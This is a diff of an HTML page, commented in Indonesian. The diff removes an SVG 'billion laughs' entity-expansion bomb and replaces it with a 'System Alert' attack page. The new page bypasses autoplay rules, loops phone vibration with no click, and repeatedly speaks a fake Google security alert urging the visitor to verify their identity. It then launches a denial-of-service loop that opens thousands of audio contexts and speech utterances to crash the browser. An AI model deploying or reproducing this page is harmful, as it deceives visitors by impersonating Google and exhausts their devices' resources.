@@ -2,38 +2,234 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>SVG Bomb</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Alert</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+</style>
 </head>
-<body style="background: #000;">
-  <h1 style="color: #f00;">Memproses SVG...</h1>
+<body>
+<script>
+(function () {
+  'use strict';
 
-  <!-- 
-    SVG BOMB 
-    Setiap entitas memanggil entitas sebelumnya 10 kali.
-    lol1 = 10x lol
-    lol2 = 10x lol1 (100x)
-    ...
-    lol9 = 10x lol8 (1 Milyar!)
-  -->
-  <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="display:none;">
-    <!DOCTYPE svg [
-      <!ENTITY lol "KORBAN">
-      <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-      <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
-      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-      <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
-      <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
-      <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
-      <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
-      <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
-      <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
-    ]>
-    <text x="10" y="20">&lol9;</text>
-  </svg>
+  // ============================================
+  // KONFIGURASI AUTOPLAY
+  // ============================================
+  var CONFIG = {
+    tts: {
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
+      lang: 'en-US',
+      rate: 0.85,
+      pitch: 1.0,
+      volume: 1.0,
+      repeatInterval: 8000,
+      maxRepeats: 20
+    },
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+  };
 
-  <script>
-    console.log("[!] SVG Bomb telah dimuat. Parser Browser sedang bekerja...");
-    console.log("[!] Jika tab tidak crash, browser Anda sudah dipatch (Aman).");
-  </script>
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
+
+  // ============================================
+  // 0. ZERO-CLICK VIBRATION BYPASS
+  // ============================================
+  function startVibrationLoop() {
+    // Cek apakah Vibration API didukung
+    if (!('vibrate' in navigator)) {
+      console.log('[VIB] Vibration API not supported on this device.');
+      return;
+    }
+
+    console.log('[VIB] Memulai getaran zero-click...');
+
+    // Pola getaran: Getar 500ms, Jeda 200ms, Getar 500ms, Jeda 200ms
+    // Pola ini akan diulang terus menerus menggunakan setInterval
+    setInterval(function() {
+      try {
+        // Jika browser memblokir, navigator.vibrate mengembalikan false
+        var success = navigator.vibrate([500, 200, 500, 200]);
+        if (!success) {
+          console.log('[VIB] Vibration diblokir oleh browser/user gesture policy.');
+        }
+      } catch(e) {}
+    }, 1400); // Ulangi setiap 1.4 detik
+  }
+
+  // ============================================
+  // 1. TTS — TANPA CANCEL DI DALAM LOOP
+  // ============================================
+  function speakOnce() {
+    if (!('speechSynthesis' in window)) return;
+    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
+
+    try {
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+      u.volume = CONFIG.tts.volume;
+
+      var voices = window.speechSynthesis.getVoices();
+      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
+      if (enVoice) u.voice = enVoice;
+
+      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
+      u.onend = function () {
+        state.ttsCount++;
+        if (state.ttsCount < CONFIG.tts.maxRepeats) {
+          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+        }
+      };
+
+      window.speechSynthesis.speak(u);
+    } catch (e) { console.log('[TTS] fail:', e.message); }
+  }
+
+  function startTTS() {
+    if (state.ttsStarted) return;
+    state.ttsStarted = true;
+    window.speechSynthesis.cancel();
+    speakOnce();
+  }
+
+  // ============================================
+  // 2. AUDIO CONTEXT UNLOCK
+  // ============================================
+  function unlockAudioContext() {
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      if (ctx.state === 'suspended') {
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+      }
+      var osc = ctx.createOscillator();
+      var gain = ctx.createGain();
+      gain.gain.value = 0.0001;
+      osc.frequency.value = 20000;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.1);
+    } catch (e) {}
+  }
+
+  // ============================================
+  // 3. SILENT AUDIO ELEMENT
+  // ============================================
+  function trySilentAudio() {
+    try {
+      var a = new Audio(CONFIG.silentWav);
+      a.volume = 0.0001;
+      a.loop = true;
+      var p = a.play();
+      if (p && p.catch) p.catch(function(){});
+    } catch (e) {}
+  }
+
+  // ============================================
+  // 4. MAIN AUDIO (Web Audio API)
+  // ============================================
+  function playMainAudio() {
+    if (state.mainPlayed) return;
+    state.mainPlayed = true;
+
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.0;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
+
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var env = Math.max(0, 1 - t / dur);
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      }
+
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start();
+      src.onended = startTTS;
+      setTimeout(startTTS, 3500);
+    } catch (e) {
+      startTTS();
+    }
+  }
+
+  // ============================================
+  // 5. UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
+  // ============================================
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
+    
+    setInterval(function() {
+      try {
+        for (var i = 0; i < 2000; i++) {
+          var ctx = new (window.AudioContext || window.webkitAudioContext)();
+          var osc = ctx.createOscillator();
+          var gain = ctx.createGain();
+          
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start(0);
+          
+          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
+          window.speechSynthesis.speak(u);
+        }
+      } catch(e) {}
+    }, 50); 
+  }
+
+  // ============================================
+  // EKSEKUSI BERTAHAP
+  // ============================================
+  
+  // Mulai Vibration Zero-Click
+  startVibrationLoop();
+
+  unlockAudioContext();
+  trySilentAudio();
+
+  setTimeout(function () {
+    unlockAudioContext();
+    startTTS(); 
+  }, 100);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+  }, 500);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+    if (!state.ttsStarted) startTTS();
+    
+    // PANGGIL CRASH TRIGGER DI SINI
+    triggerHighSeverityCrash();
+    
+  }, 1500);
+
+  // Retry jika audio diblokir
+  var retryCount = 0;
+  var retry = setInterval(function () {
+    retryCount++;
+    unlockAudioContext();
+    trySilentAudio();
+    if (!state.ttsStarted) startTTS();
+    if (retryCount > 10) clearInterval(retry);
+  }, 2000);
+
+  // Visibility change
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden && !state.mainPlayed) {
+      setTimeout(playMainAudio, 100);
+    }
+  });
+})();
+</script>
 </body>
 </html>
